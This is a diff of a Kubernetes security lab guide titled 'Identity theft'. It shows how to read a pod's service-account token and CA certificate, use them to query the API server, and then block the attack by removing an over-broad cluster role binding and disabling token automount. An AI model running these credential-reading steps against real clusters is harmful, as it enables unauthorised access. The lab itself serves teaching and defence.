@@ -1,30 +1,68 @@
 
-# getting
+# Identity theft
 
+In this lab you will steal the identity of a pod.
+
+## Attack
+
+### Getting the credentials
+
+```bash
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+```
 
-<!-- journalctl -u kubelet -->
+### Exploiting the API-Server
 
+```bash
 TOKEN=$(kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
 
-<!-- TODO APISERVER variable not set properly -->
-<!-- TODO INTERNAL_IP: 10.156.0.5 for ip server -->
-<!-- TODO hostname -i -->
+# get infos about pods
 curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
-=> should work
+```
 
-kubectl get clusterrolebindings
+## Avoiding the Attack
 
-=> check the default my-suboptimal-clusterrolebinding
+### Checking the permissions
 
+```bash
+# check permissions in the default namespace
+kubectl auth can-i --list --namespace default
+
+# check the clusterrolebinding
+kubectl describe clusterrolebinding my-suboptimal-clusterrolebinding
+
+# check the permissions of the cluster role
+kubectl describe clusterrole cluster-admin
+```
+
+### Disable permissions
+
+```bash
+# disable permissions
 kubectl delete clusterrolebinding my-suboptimal-clusterrolebinding
 
-... curl again
-=> should not work
+# try to get infos about pods - now this should fail
+curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
+```
 
-# check kubadm
-cat /etc/kubernetes/manifests/kube-apiserver.yaml 
+### Avoiding token mounts
 
-=> check authorization mode
+Disable automount of ServiceAccount Token in the file `pod.yaml`
+```yaml
+...
+spec:
+  automountServiceAccountToken: false # <= disable automount of ServiceAccount Token
+...
+```  
+
+```bash
+kubectl apply -f pod.yaml --force
+```
+
+#### Verify sensible data is not mounted anymore
+```bash
+kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+```
